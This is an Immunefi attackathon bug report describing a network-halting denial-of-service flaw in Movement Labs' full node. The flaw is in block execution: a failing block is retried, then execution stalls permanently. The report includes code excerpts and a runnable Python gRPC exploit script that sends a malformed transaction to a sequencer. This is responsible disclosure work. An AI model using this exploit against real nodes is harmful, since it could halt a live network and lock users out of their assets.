# #42941 \[BC-Critical] \[Critical] Network-Wide Denial of Service Through Unrecoverable Block Execution Failures

**Submitted on Mar 29th 2025 at 20:04:49 UTC by @hulkvision for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42941
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/networks/movement/movement-full-node>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

A critical vulnerability exists in the Movement Full Node block execution logic that allows an attacker to permanently halt the entire blockchain network by crafting malicious transactions. Once triggered, nodes cannot progress past the malicious block.

## Vulnerability Details

The vulnerability exists in the `execute_block_with_retries` function in the Movement Full Node's block execution pipeline. When a block fails to execute due to an error, the code attempts to retry execution several times with incrementally adjusted timestamps:

In `networks/movement/movement-full-node/src/node/tasks/execute_settle.rs`

```
async fn execute_block_with_retries(
    &mut self,
    block: Block,
    mut block_timestamp: u64,
) -> anyhow::Result<BlockCommitment> {
    for _ in 0..self.execution_extension.block_retry_count {
        match self.execute_block(block.clone(), block_timestamp).await {
            Ok(commitment) => return Ok(commitment),
            Err(e) => {
                info!("Failed to execute block: {:?}. Retrying", e);
                block_timestamp += self.execution_extension.block_retry_increment_microseconds;
            }
        }
    }

    anyhow::bail!("Failed to execute block after 5 retries")
}
```

```
async fn execute_block(
		&mut self,
		block: Block,
		block_timestamp: u64,
	) -> anyhow::Result<BlockCommitment> {
		//...//
		for transaction in block.transactions() {
			let signed_transaction: SignedTransaction = bcs::from_bytes(transaction.data())?; //@audit if malformed transaction is passed here, it will cause error during deserialization.
//...//
		Ok(commitment)
	}
```

Here in [Line 236](https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/networks/movement/movement-full-node/src/node/tasks/execute_settle.rs#L236) if a malformed transaction is sent, the deserialization will fail causing an error, which is not handled properly causing block execution to halt. There could be several other potential failure points in the block execution process beyond just deserialization errors, deserialization error is one of them.

The core issue is that after 5 unsuccessful retry attempts, the function simply returns an error. When this error propagates to `process_block_from_da`, the function fails. The vulnerability occurs because `process_block_from_da` has no mechanism to:

1. Skip persistently failing blocks
2. Continue processing subsequent blocks
3. Record and handle unprocessable blocks appropriately

Once a node encounters a malicious block that consistently fails execution, it becomes permanently stuck, unable to advance to subsequent blocks in the blockchain.

## Impact Details

* No new transactions can be processed
* Recovery requires code modification and network restart
* All user assets on the chain become inaccessible during the outage

## References

<https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/networks/movement/movement-full-node/src/node/tasks/execute\\_settle.rs#L150-L188\\>
<https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/networks/movement/movement-full-node/src/node/tasks/execute\\_settle.rs#L236>

## Proof of Concept

## Proof of Concept

1. setup movement full node by following the steps given in docs
2. Install these packages

```
grpcio
grpcio-tools
blake3
protobuf
```

3. create a folder named `protos`, inside it create a file with name `movement_da_light_node.proto`

```
syntax = "proto3";

package movementlabs.protocol_units.da.light_node.v1beta2;

service LightNodeService {
  rpc BatchWrite(BatchWriteRequest) returns (BatchWriteResponse);
}

message BatchWriteBlob {
  bytes data = 1;
  bytes namespace_id = 2;
  uint32 share_version = 3;
}

message BatchWriteRequest {
  repeated BatchWriteBlob blobs = 1;
}

message BatchWriteResponse {
  repeated BlobResponse blobs = 1;
}

message BlobResponse {
  oneof blob_type {
    PassedThroughBlob passed_through_blob = 1;
    SequencedBlobBlock sequenced_blob_block = 2;
  }
}

message PassedThroughBlob {
  bytes data = 1;
}

message SequencedBlobBlock {
  bytes data = 1;
}

```

4. compile the proto file with following command

```
python3 -m grpc_tools.protoc -I./protos --python_out=. --grpc_python_out=. ./protos/movement_da_light_node.proto
```

5. run this python script

```
#!/usr/bin/env python3

import grpc
import json
import time
import uuid
import random
import sys
import os
import argparse
import blake3

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from movement_da_light_node_pb2 import BatchWriteRequest, BatchWriteBlob
    from movement_da_light_node_pb2_grpc import LightNodeServiceStub
except ImportError:
    print("Error: Cannot import gRPC modules. Run the protoc command first.")
    sys.exit(1)

# Default configuration
SEQUENCER_ADDRESS = '127.0.0.1:30730'
TIMEOUT = 120

def create_transaction(seq_num):
    """Create a single transaction matching Movement's structure with proper ID"""
    payload_data = f"tx-{uuid.uuid4()}-{seq_num}-{'X' * 500}".encode()
    hasher = blake3.blake3()
    hasher.update(payload_data)
    seq_bytes = seq_num.to_bytes(8, byteorder='little')
    hasher.update(seq_bytes)
    digest = hasher.digest()
    return json.dumps({
        "data": list(payload_data),
        "application_priority": random.randint(1, 5),
        "sequence_number": seq_num,
        "id": list(digest)
    }).encode()

def send_transaction():
    """Send a single transaction to the sequencer"""
    seq_num = random.randint(0, 1_000_000)  # Generate a random sequence number
    try:
        with grpc.insecure_channel(SEQUENCER_ADDRESS, options=[
            ('grpc.max_send_message_length', 10 * 1024 * 1024),
            ('grpc.max_receive_message_length', 10 * 1024 * 1024)
        ]) as channel:
            stub = LightNodeServiceStub(channel)
            blob = BatchWriteBlob(
                data=create_transaction(seq_num),
                namespace_id=b'',
                share_version=0
            )
            response = stub.BatchWrite(BatchWriteRequest(blobs=[blob]), timeout=TIMEOUT)
            print(f"✓ Transaction sent successfully")
            return True
    except grpc.RpcError as e:
        print(f"✗ Transaction error {e.code()} - {e.details()}")
        return False

def run_exploit(args):
    """Execute the exploit"""
    global SEQUENCER_ADDRESS
    if args.host:
        SEQUENCER_ADDRESS = args.host
    
    print(f"🚀 Sending transaction to {SEQUENCER_ADDRESS}")
    start_time = time.time()
    send_transaction()
    end_time = time.time()
    print(f"✓ Transaction completed in {end_time - start_time:.2f} seconds")

def parse_args():
    parser = argparse.ArgumentParser(description='Movement Single Transaction Exploit PoC')
    parser.add_argument('--host', help=f'Target sequencer host:port (default: {SEQUENCER_ADDRESS})')
    return parser.parse_args()

if __name__ == "__main__":
    try:
        run_exploit(parse_args())
    except KeyboardInterrupt:
        print("\n⚠️ Exploit interrupted by user")

```

6. try sending a transaction you will see it will fail, or go see movement-full-node logs, you can see that it has crashed and further process of transaction is stopped.
